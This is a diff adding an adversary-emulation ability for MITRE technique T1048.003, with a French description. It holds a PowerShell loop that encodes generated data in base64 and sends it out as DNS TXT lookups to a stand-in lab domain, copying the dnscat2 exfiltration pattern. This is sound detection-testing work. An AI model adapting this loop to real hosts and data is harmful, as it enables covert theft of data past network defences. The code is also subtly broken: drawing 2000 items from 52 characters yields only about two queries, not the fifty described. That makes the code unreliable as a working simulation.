@@ -1,0 +1,21 @@
+- id: 2b3c4d5e-6f7a-4b8c-9d0e-1f2a3b4c5d6e
+  name: T1048.003 - DNS Exfiltration Simulation
+  description: |
+    Émet 50 requêtes DNS avec sous-domaines longs (50 chars base64) vers un
+    domaine de lab contrôlé. Reproduit le pattern dnscat2 / DNSExfiltrator.
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: Exfiltration Over Unencrypted Non-C2 Protocol
+  platforms:
+    windows:
+      psh:
+        command: |
+          $payload = -join ((65..90) + (97..122) | Get-Random -Count 2000 | ForEach-Object {[char]$_})
+          $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))
+          $b64 = $b64 -replace '[/+=]', 'a'
+          for ($i=0; $i -lt $b64.Length; $i+=50) {
+            $chunk = $b64.Substring($i, [Math]::Min(50, $b64.Length - $i))
+            try { Resolve-DnsName -Type TXT "$chunk.lab.internal.test" -ErrorAction SilentlyContinue | Out-Null } catch {}
+          }
+        timeout: 120
